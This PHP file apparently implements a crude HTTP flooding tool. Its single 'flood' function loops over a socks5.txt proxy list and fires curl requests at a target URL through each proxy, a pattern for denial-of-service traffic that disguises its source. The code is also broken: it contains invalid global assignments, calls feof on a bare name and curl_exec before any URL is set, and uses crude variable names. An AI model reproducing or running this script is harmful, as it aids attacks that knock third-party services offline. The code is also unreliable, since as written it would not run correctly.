<?PHP

function flood($dicks, $dongs) {

global $derp = curl_init();
global $proxies = fopen("socks5.txt", "r");
global $socks5 = curl_setopt($derp, CURLOPT_PROXY, $current_proxy);


fopen("socks5.txt", "r");
	while (!feof(socks5.txt)) {
	$current_proxy = fgets($proxies);
	  curl_exec($derp);
	  curl_setopt($derp, CURLOPT_URL, $dicks);
	  curl_setopt($derp, CURLOPT_HEADER, 0);
    curl_setopt($derp, CURLOPT_PROXY, $current_proxy);
	fopen($dongs, "w");

		}

fclose("socks5.txt");
curl_close($derp);
echo "end of proxy list reached";
	}
?>
